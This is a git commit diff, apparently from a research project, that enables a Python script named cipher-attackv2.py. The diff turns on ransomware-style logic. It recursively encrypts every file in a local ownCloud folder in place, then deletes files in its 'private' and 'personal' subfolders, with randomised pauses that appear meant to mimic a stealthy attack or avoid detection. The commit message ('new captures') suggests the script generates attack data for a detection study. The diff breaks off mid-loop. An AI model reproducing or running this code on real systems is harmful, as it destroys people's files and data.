4230e1b669ce774d9ccf50dd6347a77e437309b8
Pedro <pedralmeida.22.99@gmail.com>
2021-06-22 15:52:39 +0100

    novas capturas

--- cipher-attackv2.py
+++ cipher-attackv2.py
@@ -10,28 +10,43 @@ PATH = "/home/pedralmeida/Documents/owncloud/"
 
 
 def main():
-    # encryptor = Encryptor()
-    # mykey = encryptor.key_create()
-    # encryptor.key_write(mykey, 'mykey.key')
-    # loaded_key = encryptor.key_load('mykey.key')
-    #
-    # files = [f for f in glob.glob(PATH + "**/*", recursive=True)]
-    # print("Encrypting...")
-    # count = 0
-    # for f in files:
-    #     if count >= 60:
-    #         time.sleep(random.randint(2, 5))
-    #         count = 0
-    #     if os.path.isfile(f):
-    #         print(f)
-    #         encryptor.file_encrypt(loaded_key, f, f)
-    #         time.sleep(0.2)
-    #         count += 1
-    #
-    # time.sleep(random.randint(5, 15))
+    encryptor = Encryptor()
+    mykey = encryptor.key_create()
+    encryptor.key_write(mykey, 'mykey.key')
+    loaded_key = encryptor.key_load('mykey.key')
+
+    files = [f for f in glob.glob(PATH + "**/*", recursive=True)]
+    print("Encrypting...")
+    count = 0
+    for f in files:
+        if count >= 60:
+            time.sleep(random.randint(2, 5))
+            count = 0
+        if os.path.isfile(f):
+            print(f)
+            encryptor.file_encrypt(loaded_key, f, f)
+            time.sleep(0.2)
+            count += 1
+
+    time.sleep(random.randint(5, 15))
 
     print("Deleting...")
-    files = [f for f in glob.glob(PATH + "/Documents/" + "**/*", recursive=True)]
+    files = [f for f in glob.glob(PATH + "/private/" + "**/*", recursive=True)]
+    count = 0
+    for f in files:
+        if count >= 30:
+            time.sleep(random.randint(2, 5))
+            count = 0
+
+        if os.path.isfile(f):
+            print(f)
+            os.remove(f)
+            time.sleep(0.2)
+            count += 1
+
+    time.sleep(random.randint(5, 15))
+
+    files = [f for f in glob.glob(PATH + "/personal/" + "**/*", recursive=True)]
     count = 0
     for f in files:
         if count >= 30:
